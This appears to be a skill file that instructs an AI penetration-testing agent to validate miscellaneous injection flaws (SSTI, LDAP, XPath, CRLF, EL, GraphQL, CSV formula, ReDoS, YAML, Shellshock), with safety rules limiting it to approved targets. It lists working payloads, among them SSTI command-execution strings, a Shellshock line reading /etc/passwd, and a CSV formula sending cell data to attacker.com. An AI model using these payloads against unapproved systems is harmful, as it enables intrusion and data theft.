---
name: injection-testing
description: Validate miscellaneous injection vulnerabilities NOT covered by dedicated skills. Covers SSTI, LDAP, XPath, XQuery, CRLF/HTTP Header, Email Header, GraphQL, Expression Language (EL/OGNL), JSON/JavaScript eval injection, ORM/HQL, CSV/Formula, Regex (ReDoS), YAML config, and Shellshock-style injection. Use when testing CWE-1336 (SSTI), CWE-90 (LDAP), CWE-643 (XPath), CWE-652 (XQuery), CWE-93/CWE-113 (CRLF/Header), CWE-917 (EL), CWE-94/CWE-95 (Code/Eval injection), CWE-1333 (ReDoS), CWE-1236 (CSV/Formula), and related injection classes.
allowed-tools: Read, Write, Bash
---

# Injection Testing Skill (Miscellaneous)

## Purpose
Validate miscellaneous injection vulnerabilities by sending crafted payloads to user-controlled inputs and observing:
- **Template evaluation** (SSTI)
- **Query manipulation** (LDAP, XPath, XQuery, GraphQL, ORM/HQL)
- **Header manipulation** (CRLF, HTTP Header, Email Header)
- **Expression/code evaluation** (EL, OGNL, Spring EL, JavaScript eval)
- **Resource exhaustion** (ReDoS)
- **Formula execution** (CSV/Spreadsheet injection)
- **Config manipulation** (YAML, Environment variables)

## Scope Note

**This skill covers injection types WITHOUT dedicated skills.**

For the following, use the dedicated skills:
- SQL Injection → `sql-injection-testing`
- NoSQL Injection → `nosql-injection-testing`
- Cross-Site Scripting (XSS) → `xss-testing`
- XML External Entity (XXE) → `xxe-testing`
- OS Command Injection → `command-injection-testing`

## Vulnerability Types Covered

### 1. Server-Side Template Injection - SSTI (CWE-1336)
Inject template expressions that execute on server.

**Detection Methods:**
- **Math evaluation:** `{{7*7}}` returns `49` in response
- **Engine fingerprinting:** Different payloads for Jinja2, Twig, Freemarker, Velocity, Pebble, Thymeleaf

**Common Payloads by Engine:**

| Engine | Detection Payload | RCE Payload Example |
|--------|-------------------|---------------------|
| Jinja2 (Python) | `{{7*7}}` | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` |
| Twig (PHP) | `{{7*7}}` | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` |
| Freemarker (Java) | `${7*7}` | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| Velocity (Java) | `#set($x=7*7)$x` | `#set($e="")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime"...` |
| Thymeleaf (Java) | `${7*7}` | `${T(java.lang.Runtime).getRuntime().exec('id')}` |
| Pebble (Java) | `{{7*7}}` | (Limited sandbox escape) |
| Smarty (PHP) | `{7*7}` | `{system('id')}` |
| ERB (Ruby) | `<%= 7*7 %>` | `<%= system('id') %>` |

### 2. LDAP Injection (CWE-90)
Manipulate LDAP queries via special characters.

**Detection Methods:**
- **Wildcard bypass:** `*` returns all entries
- **Filter manipulation:** `)(cn=*)` modifies filter logic
- **Boolean-based:** `)(|(password=*))` vs normal query

**Test Payloads:**
```
*
*)(&
*)(|(&
admin)(|(password=*))
admin)(!(&(1=0
*))%00
```

### 3. XPath Injection (CWE-643)
Manipulate XPath queries in XML-based applications.

**Detection Methods:**
- **Boolean-based:** `' or '1'='1` returns all nodes
- **Error-based:** `'` causes XPath syntax error
- **Union-style:** `' or count(//*)>0 or '1'='1`

**Test Payloads:**
```
' or '1'='1
' or ''='
1 or 1=1
'] | //user/*[contains(*,'
' or count(//*)>0 or '1'='1
```

### 4. XQuery Injection (CWE-652)
Manipulate XQuery expressions in XML databases.

**Detection Methods:**
- Similar to XPath; targets XQuery-capable systems (eXist-db, MarkLogic, BaseX)

**Test Payloads:**
```
' or '1'='1
') or ('1'='1
for $x in doc("users.xml")//user return $x
```

### 5. CRLF / HTTP Header Injection (CWE-93, CWE-113)
Inject carriage return/line feed to manipulate HTTP headers.

**Detection Methods:**
- **Response splitting:** `%0d%0aSet-Cookie:injected=value` adds header
- **Header injection:** `%0d%0aX-Injected:header` appears in response headers
- **Host header poisoning:** Manipulated Host header affects redirects/URLs

**Test Payloads:**
```
%0d%0aInjected-Header:value
%0d%0aSet-Cookie:session=hijacked
%0d%0a%0d%0a<html>Injected Body</html>
\r\nX-Injected:true
```

### 6. Email Header Injection (CWE-93)
Inject headers into email messages via SMTP.

**Detection Methods:**
- **BCC injection:** `victim@test.com%0ABcc:attacker@evil.com` adds BCC
- **Subject manipulation:** `%0ASubject:Spoofed` changes subject

**Test Payloads:**
```
victim@test.com%0ABcc:attacker@evil.com
victim@test.com\r\nBcc:attacker@evil.com
test%0ACc:attacker@evil.com
test\nSubject:INJECTED
```

### 7. Expression Language Injection (CWE-917)
Inject EL expressions in Java-based frameworks (Spring, JSP, OGNL).

**Detection Methods:**
- **Math evaluation:** `${7*7}` or `#{7*7}` returns `49`
- **Object access:** `${applicationScope}` leaks data

**Test Payloads by Framework:**

| Framework | Detection | Notes |
|-----------|-----------|-------|
| Spring EL | `${7*7}`, `#{7*7}` | Double resolution in older versions |
| OGNL (Struts) | `%{7*7}`, `${7*7}` | Many CVEs (Struts2) |
| JSP EL | `${7*7}`, `#{7*7}` | Standard Java EE |
| MVEL | `${7*7}` | Used in some workflow engines |

### 8. JSON/JavaScript Eval Injection (CWE-94, CWE-95)
Inject JavaScript expressions into server-side evaluation contexts (Node.js or embedded JS engines) where user input is passed to `eval()`, `Function()`, `vm.runInNewContext`, or similar.

**Detection Methods:**
- **Math evaluation:** `7*7` returns `49` (computed, not echoed)
- **Built-in evaluation:** `Math.imul(7,7)` returns `49`
- **Structure evaluation:** `['a','b'].length` returns `2`

**Test Payloads (detection-only):**
```text
7*7
Math.imul(7,7)
['a','b'].length
JSON.stringify({a:1})
```

**Safety:** Treat any server-side JavaScript evaluation as high-risk; stop at detection-only payloads.

### 9. GraphQL Injection (CWE-74, CWE-89 variant)
Manipulate GraphQL queries for data exfiltration or DoS.

**Detection Methods:**
- **Introspection abuse:** `{__schema{types{name}}}` reveals schema
- **Batching attacks:** Multiple queries in single request
- **Nested query DoS:** Deep nesting causes resource exhaustion
- **Field suggestion:** Error messages reveal valid fields

**Test Payloads:**
```graphql
{__schema{queryType{name}}}
{__schema{types{name,fields{name}}}}
query{user(id:"1' OR '1'='1"){name}}
{user(id:1){friends{friends{friends{name}}}}}
```

### 10. ORM/HQL Injection (CWE-89 variant, CWE-943)
Inject into ORM queries beyond basic SQL (Hibernate HQL, JPA JPQL, Django ORM).

**Detection Methods:**
- **HQL-specific syntax:** `' and 1=1 --` in Hibernate
- **JPQL injection:** Concatenated JPQL strings
- **Django ORM:** `__` field lookup manipulation

**Test Payloads:**
```
' or 1=1 --
' and substring(username,1,1)='a
admin' AND (SELECT COUNT(*) FROM User)>0 AND '1'='1
```

### 11. CSV/Formula Injection (CWE-1236)
Inject spreadsheet formulas into exported CSV/Excel files.

**Detection Methods:**
- **Formula execution:** `=1+1` or `=cmd|'/C calc'!A0` in exported data
- **DDE injection:** `=IMPORTXML(...)` data exfiltration

**Test Payloads (detection only):**
```
=1+1
=SUM(1,2)
+1+1
-1+1
@SUM(1+1)
=cmd|'/C calc'!A0
=HYPERLINK("http://attacker.com/?data="&A1)
```

**Note:** Test only in isolated environments; formulas can execute on user machines.

### 12. Regex Injection / ReDoS (CWE-1333)
Inject patterns causing catastrophic backtracking in regex engines.

**Detection Methods:**
- **Time-based:** Malicious pattern causes significant delay
- **Resource exhaustion:** CPU spike from nested quantifiers

**Test Payloads:**
```
(a+)+$
((a+)+)+$
(a|a)+$
([a-zA-Z]+)*$
(.*a){x}  (where x is large, e.g., 20)
```

**Target input for (a+)+$:** `aaaaaaaaaaaaaaaaaaaaaaaa!`

### 13. YAML/Config Injection (CWE-502 related)
Inject YAML constructs for config manipulation (non-deserialization scenarios).

**Detection Methods:**
- **Anchor abuse:** `*alias` references in YAML
- **Merge key injection:** `<<:` merges dictionaries
- **Multi-document:** `---` separates documents

**Test Payloads:**
```yaml
key: !!python/object/apply:os.system ['id']
<<: *dangerous_anchor
admin: true
---
override: value
```

### 14. Shellshock/Environment Variable Injection (CWE-78 variant)
Inject into environment variables processed by bash.

**Detection Methods:**
- **Function injection:** `() { :; }; echo VULNERABLE`
- **CGI exploitation:** Via User-Agent, Referer headers to CGI scripts

**Test Payloads:**
```
() { :; }; echo SHELLSHOCK
() { :; }; /bin/sleep 5
() { :;}; /bin/cat /etc/passwd
```

## Prerequisites
- Target application running and reachable
- Identified injection points (parameters, headers, body fields)
- VULNERABILITIES.json with suspected injection findings if provided

## Testing Methodology

### Phase 1: Identify Injection Points

Analyze for potential injection vectors:
- **URL parameters:** Query strings, path segments
- **POST body:** JSON, form data, GraphQL queries
- **HTTP headers:** User-Agent, Referer, X-Forwarded-For, Host, Cookie
- **File exports:** CSV downloads, report generation
- **Email functionality:** Contact forms, notification systems
- **Template rendering:** User-controlled content in pages/emails
- **Search/filter features:** Often use LDAP, XPath, or custom queries

### Phase 2: Establish Baseline
Send normal request and record:
- Response time (for time-based detection)
- Response content/length (for boolean-based detection)
- HTTP status code
- Response headers (for header injection)

### Phase 3: Execute Injection Tests

**SSTI Test:**
```python
payloads = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{7*7}"]
for payload in payloads:
    resp = get(f"/template?name={quote(payload)}")
    if "49" in resp.text:
        status = "VALIDATED"
        engine = identify_engine(payload)
```

**LDAP Injection Test:**
```python
baseline = get("/search?user=john")
test = get("/search?user=*")
if len(test.text) > len(baseline.text) * 5:
    status = "VALIDATED"  # Wildcard returned all users
```

**CRLF Injection Test:**
```python
payload = "test%0d%0aX-Injected:true"
resp = get(f"/redirect?url={payload}")
if "X-Injected" in resp.headers:
    status = "VALIDATED"
```

**EL Injection Test:**
```python
payloads = ["${7*7}", "#{7*7}", "%{7*7}"]
for payload in payloads:
    resp = get(f"/page?input={quote(payload)}")
    if "49" in resp.text:
        status = "VALIDATED"
```

**ReDoS Test:**
```python
baseline_time = measure("/search?pattern=test")
malicious_pattern = "(a+)+$"
malicious_input = "a" * 30 + "!"
test_time = measure(f"/search?pattern={quote(malicious_pattern)}&input={quote(malicious_input)}")
if test_time > baseline_time + 5:
    status = "VALIDATED"
```

### Phase 4: Classification Logic

| Status | Meaning |
|--------|---------|
| **VALIDATED** | Injection confirmed (eval, data leak, header added, delay) |
| **FALSE_POSITIVE** | Input properly sanitized |
| **PARTIAL** | Some indicators but not definitive |
| **UNVALIDATED** | Blocked, error, or insufficient evidence |

### Phase 5: Capture Evidence

Capture minimal structured evidence (redact PII/secrets, truncate to 8KB, hash full response):
- `status`, `injection_type`, `cwe`
- Baseline request (url, method, status, response_time)
- Test request (url, method, status, response details)
- Payload used and detected indicator

### Phase 6: Safety Rules
- Detection-only payloads (math evaluation, timing, markers)
- NEVER execute destructive commands via SSTI/EL
- Do not exfiltrate real data
- CSV formula testing only in isolated environments
- Respect rate limits; avoid causing DoS

## Output Guidelines
- Keep responses concise (1-4 sentences)
- Include endpoint, payload, detection method, and impact

**Validated examples:**
```
SSTI (Jinja2) on /greet - {{7*7}} evaluated to 49. RCE possible via template engine.
LDAP injection on /search - wildcard returned 500+ users vs 1. Data exposure risk.
CRLF injection on /redirect - X-Injected header added to response. Response splitting possible.
EL injection on /page - ${7*7} evaluated in Spring EL context. Code execution risk.
GraphQL introspection on /graphql - schema exposed via __schema query. API structure revealed.
```

**Unvalidated example:**
```
SSTI test incomplete on /template - all payloads returned literal text. Evidence: path/to/evidence.json
```

## CWE Mapping
**Primary CWEs (DAST-testable):**
- **CWE-1336:** Improper Neutralization of Special Elements Used in a Template Engine (SSTI)
- **CWE-90:** Improper Neutralization of Special Elements used in an LDAP Query (LDAP Injection)
- **CWE-643:** Improper Neutralization of Data within XPath Expressions (XPath Injection)
- **CWE-652:** Improper Neutralization of Data within XQuery Expressions (XQuery Injection)
- **CWE-93:** Improper Neutralization of CRLF Sequences (CRLF Injection)
- **CWE-113:** Improper Neutralization of CRLF Sequences in HTTP Headers (HTTP Response Splitting)
- **CWE-644:** Improper Neutralization of HTTP Headers for Scripting Syntax
- **CWE-917:** Improper Neutralization of Special Elements used in an Expression Language Statement (EL Injection)
- **CWE-1333:** Inefficient Regular Expression Complexity (ReDoS)
- **CWE-1236:** Improper Neutralization of Formula Elements in a CSV File (CSV/Formula Injection)
- **CWE-94:** Improper Control of Generation of Code (Code Injection)
- **CWE-95:** Improper Neutralization of Directives in Dynamically Evaluated Code (Eval Injection)

**Additional CWEs commonly implicated by covered techniques:**
- **CWE-200:** Exposure of Sensitive Information to an Unauthorized Actor (GraphQL introspection / verbose errors)
- **CWE-400:** Uncontrolled Resource Consumption (GraphQL depth/batching and ReDoS impact)
- **CWE-502:** Deserialization of Untrusted Data (unsafe YAML object deserialization)
- **CWE-78:** OS Command Injection (Shellshock-style environment variable injection)
- **CWE-89:** SQL Injection (ORM/HQL and GraphQL arguments reaching SQL sinks)
- **CWE-564:** SQL Injection: Hibernate (HQL/JPQL variants)
- **CWE-943:** Improper Neutralization of Special Elements in Data Query Logic (query-language injection class)

**Related/Parent CWEs:**
- **CWE-74:** Improper Neutralization of Special Elements in Output Used by a Downstream Component (Injection - parent)
- **CWE-96:** Improper Neutralization of Directives in Statically Saved Code (Static Code Injection)
- **CWE-97:** Improper Neutralization of Server-Side Includes (SSI Injection)
- **CWE-99:** Improper Control of Resource Identifiers (Resource Injection)
- **CWE-116:** Improper Encoding or Escaping of Output
- **CWE-20:** Improper Input Validation

**Related Attack Patterns:**
- **CAPEC-250:** XML Injection
- **CAPEC-136:** LDAP Injection
- **CAPEC-83:** XPath Injection
- **CAPEC-34:** HTTP Response Splitting
- **CAPEC-105:** HTTP Request Splitting
- **CAPEC-15:** Command Delimiters
- **CAPEC-468:** Generic Cross-Browser Cross-Domain Theft

## Notable CVEs (examples)
- **CVE-2025-66438 (Frappe ERPNext):** SSTI via Print Format rendering (CVSS 9.8).
- **CVE-2023-22527 (Atlassian Confluence):** OGNL injection leading to RCE.
- **CVE-2022-22965 (Spring4Shell):** Spring EL injection via data binding.
- **CVE-2021-44228 (Log4Shell):** JNDI lookup injection (related to EL concepts).
- **CVE-2020-17530 (Apache Struts):** OGNL injection via tag attributes.
- **CVE-2019-11358 (jQuery):** Prototype pollution (related injection pattern).
- **CVE-2017-9805 (Apache Struts):** REST plugin XStream RCE.

## Safety Reminders
- ONLY test against user-approved targets
- Use detection-only payloads (math eval, timing, markers)
- NEVER execute destructive commands via SSTI/EL
- Do not exfiltrate real data
- CSV formula testing only in isolated environments
- Stop if production protections trigger

## Reference Implementations
- See `reference/injection_payloads.py` for payload generators by injection type
- See `reference/validate_injection.py` for injection validation flow
- See `examples.md` for concrete scenarios and evidence formats

### Additional Resources
- [OWASP SSTI Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Template_Injection_Prevention_Cheat_Sheet.html)
- [OWASP LDAP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
